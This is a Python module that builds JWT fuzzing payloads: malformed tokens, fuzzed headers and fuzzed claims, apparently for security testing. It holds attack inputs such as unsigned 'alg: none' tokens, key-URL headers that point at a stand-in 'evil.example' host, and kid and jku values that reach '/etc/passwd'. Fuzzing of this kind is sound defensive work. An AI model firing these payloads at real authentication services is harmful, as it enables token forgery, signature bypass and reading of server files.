"""JWT payload generators for fuzzing."""


def generate_malformed_jwt() -> list[str]:
    """Return a list of malformed JWT tokens covering common attack vectors."""
    import base64
    import json

    def b64url(obj: object) -> str:
        return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()

    payloads: list[str] = []

    claims = {"sub": "admin", "role": "admıñ", "x": "\u0000"}

    header_alg_none = {"alg": "none", "typ": "JWT"}
    header_alg_rs256 = {
        "alg": "RS256",
        "kid": "../../../dev/null",
        "jku": "http://evil.example/jwks.json",
    }

    payloads.append(".")
    payloads.append("..")
    payloads.append("")
    payloads.append("abc.abc")
    payloads.append("a.b.c.d")
    payloads.append("a" * 65536)
    payloads.append(".")
    payloads.append(
        b64url(header_alg_none) + "." + b64url(claims) + "."
    )
    payloads.append(
        b64url(header_alg_rs256) + "." + b64url({"sub": "admin"}) + "."
        + "A" * 65536
    )
    payloads.append(
        b64url(header_alg_none) + "." + "not_base64" + "."
    )
    payloads.append("header." + "x" * 1024 + ".sig")
    payloads.append(
        b64url({"alg": "RS256", "kid": "0" * min(8192, max(1, 4096))})
        + "." + b64url({"sub": "admin"}) + "." + "sig"
    )
    claims_massive = {"data": "A" * 70000}
    payloads.append(
        b64url({"alg": "HS256"}) + "." + b64url(claims_massive) + ".sig"
    )

    return payloads


def fuzz_jwt_header() -> list[dict]:
    """Return fuzzed JWT header dicts targeting alg, kid, jku, x5u."""
    payloads: list[dict] = [
        {"alg": "none"},
        {"alg": "NONE"},
        {"alg": "NoNe"},
        {"alg": "HS256", "kid": "../../../../etc/passwd"},
        {"alg": "RS256", "kid": "\\u0000\\u0000\\u0000"},
        {"alg": "RS256", "jku": "http://0.0.0.0"},
        {"alg": "RS256", "jku": "file:///etc/passwd"},
        {"alg": "RS256", "x5u": "http://evil.example/cert.pem"},
        {"alg": "RS256", "x5u": "file:///dev/null"},
        {"alg": "RS256", "kid": "a" * 4096},
        {"alg": "RS256", "jku": "http://[::1]:22/"},
        {"alg": "A128CBC-HS512"},
        {"alg": ""},
        {"alg": None},
        {"kid": "-1"},
        {"kid": "1e309"},
        {"kid": "0" * 10000},
    ]
    return payloads


def fuzz_jwt_claims() -> list[dict]:
    """Return fuzzed JWT claim dicts covering homoglyphs, type confusion, and extremes."""
    return [
        {"admıñ": "true"},
        {"user": "\u200b"},
        {"sub": 12345678901234567890},
        {"role": ["admin", "admin", "admin"]},
        {"role": None},
        {"exp": "not_a_timestamp"},
        {"x": "A" * 100000},
        {"payload": {"__proto__": {"admin": True}}},
        {"aud": None},
        {"iss": "\u0000\u0001\u0002"},
    ]
